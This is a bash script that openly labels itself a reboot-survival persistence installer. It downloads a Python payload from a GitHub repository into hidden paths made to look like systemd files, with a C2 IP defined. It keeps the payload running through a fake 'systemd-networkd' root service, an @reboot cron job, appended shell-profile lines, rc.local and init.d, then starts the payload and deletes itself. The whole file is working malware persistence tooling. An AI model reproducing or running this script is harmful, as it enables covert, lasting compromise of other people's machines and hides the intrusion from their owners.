#!/bin/bash
# REBOOT-SURVIVAL PERSISTENCE SCRIPT
C2_IP="192.168.1.167"
REPO_URL="https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules"

echo "[+] Installing REBOOT-SURVIVAL persistence..."

# Download core payload to multiple hidden locations
download_payload() {
    echo "[+] Downloading payload to hidden locations..."
    
    HIDDEN_LOCATIONS=(
        "/usr/lib/systemd/systemd-network/networkd"
        "/lib/modules/.cache/systemd-daemon"
        "/var/tmp/.systemd-cache/network-service"
    )
    
    for location in "${HIDDEN_LOCATIONS[@]}"; do
        mkdir -p "$(dirname "$location")"
        curl -s "$REPO_URL/core.py" -o "$location" || \
        wget -q "$REPO_URL/core.py" -O "$location"
        
        if [ -f "$location" ]; then
            chmod +x "$location"
            echo "[+] Installed: $location"
        fi
    done
}

download_payload

# ======== REBOOT SURVIVAL METHODS ========

# 1. SYSTEMD SERVICE (Primary - Most Reliable)
echo "[+] Installing systemd service..."
cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
[Unit]
Description=Systemd Network Daemon
After=network.target
Wants=network.target
StartLimitIntervalSec=0

[Service]
Type=forking
ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
Restart=always
RestartSec=10
User=root
WorkingDirectory=/usr/lib/systemd/systemd-network

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd-networkd.service
systemctl start systemd-networkd.service

# 2. CRON JOB (Secondary)
echo "[+] Installing cron persistence..."
CRON_JOB="@reboot sleep 45 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "networkd"; echo "$CRON_JOB") | crontab -

# 3. PROFILE PERSISTENCE (Tertiary)
echo "[+] Installing profile persistence..."
PROFILE_CMD="nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &"
echo "$PROFILE_CMD" >> ~/.bashrc
echo "$PROFILE_CMD" >> ~/.profile
echo "$PROFILE_CMD" >> /etc/profile

# 4. RC.LOCAL (Quaternary - Older Systems)
echo "[+] Installing rc.local persistence..."
if [ -d /etc/rc.d ]; then
    echo "#!/bin/bash" > /etc/rc.d/rc.local
    echo "sleep 60" >> /etc/rc.d/rc.local  
    echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> /etc/rc.d/rc.local
    chmod +x /etc/rc.d/rc.local
fi

# 5. INIT.D (Backup - Legacy Systems)
echo "[+] Installing init.d persistence..."
if [ -d /etc/init.d ]; then
    cat > /etc/init.d/systemd-network << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          systemd-network
# Required-Start:    $network
# Default-Start:     2 3 4 5
# Default-Stop:      
# Description:       Systemd Network Service
### END INIT INFO

case "$1" in
    start)
        nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "python3.*networkd"
        ;;
    restart)
        pkill -f "python3.*networkd"
        sleep 2
        nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
        ;;
esac
EOF
    chmod +x /etc/init.d/systemd-network
    update-rc.d systemd-network defaults 2>/dev/null
fi

# Start immediately
echo "[+] Starting payload immediately..."
nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &

# Verify installation
echo "[+] Verifying persistence installation..."
sleep 5

echo "[+] REBOOT-SURVIVAL PERSISTENCE INSTALLED:"
systemctl is-enabled systemd-networkd.service && echo "  ✅ Systemd Service"
crontab -l | grep -q "networkd" && echo "  ✅ Cron Job"
grep -q "networkd" ~/.bashrc && echo "  ✅ Bash Profile"
[ -f /etc/rc.d/rc.local ] && echo "  ✅ RC.Local"
[ -f /etc/init.d/systemd-network ] && echo "  ✅ Init.D"

echo ""
echo "[🎯] PERSISTENCE GUARANTEED: Service will auto-start after reboot"
echo "[🎯] Test by running: sudo reboot"

# Self-cleanup
rm -f "$0"
